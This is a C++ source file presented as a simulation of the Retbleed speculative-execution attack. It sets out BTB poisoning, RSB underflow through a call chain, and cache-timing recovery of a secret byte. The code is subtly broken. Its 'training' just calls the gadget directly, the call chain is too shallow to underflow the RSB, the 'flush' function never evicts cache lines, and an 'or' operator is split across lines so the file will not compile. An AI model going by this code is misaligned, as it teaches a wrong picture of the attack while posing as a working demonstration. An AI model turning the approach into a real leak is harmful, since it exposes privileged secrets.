#include <iostream>
#include <vector>
#include <chrono>
#include <map>

// --- Victim's Code (simulated privileged/isolated context) ---
unsigned char secret_value = 0xAB; // The secret to leak
unsigned char probe_array[256 * 4096]; // Cache side channel

// Attacker-controlled gadget (similar to Spectre V2)
void attacker_ret_gadget() {
    unsigned char leaked_byte = secret_value; // Transiently read secret
    volatile unsigned char temp = probe_array[leaked_byte * 4096]; // Cache side effect
}

// A series of nested calls to underflow RSB
// In a real attack, this would be a deep call stack in the victim's code
// or a sequence of calls the attacker can induce.
void deep_call_level_1();
void deep_call_level_2();
void deep_call_level_3();
//... up to N levels to underflow RSB

void deep_call_level_N() {
    // This is the function whose RET will be exploited
    // In a real scenario, this RET would be part of a privileged function.
    // The attacker would have trained the BTB to point to attacker_ret_gadget
    // when this RET is predicted by the BTB.
    // For simplicity, we'll directly call the gadget here for BTB training.
    // The actual RET instruction will be at the end of this function.
}

void deep_call_level_3() { deep_call_level_N(); }
void deep_call_level_2() { deep_call_level_3(); }
void deep_call_level_1() { deep_call_level_2(); } // Start of the deep call chain

// --- Attacker's Code ---
long long measure_access_time(volatile unsigned char* addr) {
    auto start = std::chrono::high_resolution_clock::now();
    volatile unsigned char temp = *addr;
    auto end = std::chrono::high_resolution_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
}

void flush_cache_line(volatile unsigned char* addr) {
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array[i] = 0;
    }
}

int main() {
    // Initialize probe_array
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array[i] = 1;
    }

    std::cout << "Starting Retbleed (Intel RSB Underflow) attack simulation..." << std::endl;

    // Phase 1: Train the BTB for the attacker gadget
    // This is similar to Spectre V2 training. The attacker needs to make the BTB
    // associate the return address of deep_call_level_N with attacker_ret_gadget.
    // This is complex and depends on BTB aliasing. For simplicity, we simulate
    // training the BTB with the gadget's address.
    std::cout << "Training BTB with attacker gadget address (simulated)..." << std::endl;
    // In a real attack, this would involve calling many indirect branches
    // that alias with the return site of deep_call_level_N and point to attacker_ret_gadget.
    // We'll just call the gadget directly to ensure its address is in BTB.
    for (int i = 0; i < 100; ++i) {
        // This is a simplification. Real training is more subtle.
        // We're essentially making the BTB believe that a RET from deep_call_level_N
        // should go to attacker_ret_gadget.
        void (*temp_ptr)() = &attacker_ret_gadget;
        temp_ptr();
    }

    // Phase 2: Underflow the RSB and trigger the victim's RET
    std::cout << "Underflowing RSB and triggering victim RET..." << std::endl;
    // Flush the probe array before triggering
    for (int i = 0; i < 256; ++i) {
        flush_cache_line(&probe_array[i * 4096]);
    }

    // Call a deep stack of functions to underflow the RSB.
    // When deep_call_level_N returns, the RSB is empty, and the CPU falls back
    // to the BTB for prediction, which is now poisoned.
    deep_call_level_1(); // This will call deep_call_level_2, then deep_call_level_3, etc.

    // Phase 3: Recover the secret via side channel
    std::cout << "Measuring cache access times to recover secret..." << std::endl;
    long long min_time = -1;
    int leaked_byte = -1;

    for (int i = 0; i < 256; ++i) {
        long long time = measure_access_time(&probe_array[i * 4096]);
        if (min_time == -1 |
| time < min_time) {
            min_time = time;
            leaked_byte = i;
        }
    }

    std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
    std::cout << "Expected secret byte: 0x" << std::hex << (int)secret_value << std::endl;

    return 0;
}